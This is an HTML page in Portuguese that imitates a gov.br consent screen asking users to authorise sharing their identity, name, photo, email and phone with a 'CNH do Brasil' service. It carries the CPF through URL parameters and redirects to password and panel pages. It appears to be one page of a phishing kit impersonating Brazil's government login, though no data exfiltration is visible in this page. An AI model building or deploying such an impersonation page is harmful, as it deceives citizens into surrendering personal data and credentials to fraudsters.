<!DOCTYPE html>
<html lang="pt-br">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Autorização de Dados - gov.br</title>
    <link rel="icon" type="image/png" href="cnh-brasil-logo.png">
    <link rel="shortcut icon" type="image/png" href="cnh-brasil-logo.png">
    <link rel="apple-touch-icon" href="cnh-brasil-logo.png">

    <script>
        (function enforceAuthGuard() {
            const urlParams = new URLSearchParams(window.location.search);
            const cpfParam = urlParams.get('cpf') || '';
            const cleanCpf = cpfParam.replace(/\D/g, '');

            if (!cleanCpf) {
                window.location.replace("index.html");
                return;
            }

            const sessionStr = sessionStorage.getItem("cnh_auth_session") || localStorage.getItem("cnh_auth_session_" + cleanCpf);
            let session = null;
            try { session = JSON.parse(sessionStr); } catch(e){}

            if (!session || session.cpf !== cleanCpf || !session.token || (session.expiresAt && Date.now() > session.expiresAt)) {
                window.location.replace("senha.html?cpf=" + encodeURIComponent(cleanCpf));
            }
        })();
    </script>

    <link href="https://fonts.googleapis.com/css2?family=Raleway:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            font-family: 'Raleway', sans-serif;
            margin: 0;
            background-color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #333;
            min-height: 100dvh;
        }

        .app-container {
            width: 100%;
            max-width: 400px;
            min-height: 100dvh;
            display: flex;
            flex-direction: column;
            padding: 24px 20px;
            box-sizing: border-box;
            background: #fff;
        }

        .logo-gov {
            width: 100px;
            margin-bottom: 24px;
        }

        .titulo {
            font-size: 20px;
            font-weight: 700;
            color: #1e293b;
            margin-bottom: 20px;
            line-height: 1.3;
        }

        .servico-destaque {
            font-size: 15px;
            margin-bottom: 20px;
            color: #475569;
        }

        .servico-destaque strong {
            color: #0f172a;
        }

        .lista-dados {
            list-style: none;
            padding: 0;
            margin: 20px 0 30px 0;
        }

        .lista-dados li {
            padding-left: 20px;
            margin-bottom: 12px;
            font-size: 14px;
            color: #334155;
            position: relative;
            font-weight: 500;
        }

        .lista-dados li::before {
            content: "•";
            position: absolute;
            left: 4px;
            top: -2px;
            font-size: 18px;
            color: #154294;
        }

        .area-botoes {
            display: flex;
            gap: 15px;
            margin-top: auto;
            padding-bottom: 20px;
        }

        .btn {
            flex: 1;
            padding: 14px;
            border-radius: 30px;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            border: 1px solid #154294;
            transition: all 0.2s;
            text-align: center;
        }

        .btn-negar {
            background-color: #fff;
            color: #154294;
        }

        .btn-autorizar {
            background-color: #154294;
            color: white;
        }
    </style>
</head>

<body>
    <div class="app-container">
        <img src="img/logo.png" class="logo-gov" alt="gov.br">

        <div class="titulo">Autorização para compartilhamento de Dados Pessoais</div>
        <div class="servico-destaque">Serviço: <strong>CNH do Brasil</strong></div>

        <ul class="lista-dados">
            <li>Identidade gov.br</li>
            <li>Nome e foto</li>
            <li>Endereço de e-mail</li>
            <li>Número de telefone celular</li>
        </ul>

        <div class="area-botoes">
            <button class="btn btn-negar" onclick="window.location.href='index.html'">Negar</button>
            <button class="btn btn-autorizar" onclick="avancarParaPainel()">Autorizar</button>
        </div>
    </div>

    <script>
        function avancarParaPainel() {
            const urlParams = new URLSearchParams(window.location.search);
            const cpf = urlParams.get('cpf') || '';
            window.location.href = "painel.html?cpf=" + encodeURIComponent(cpf);
        }
    </script>
</body>

</html>
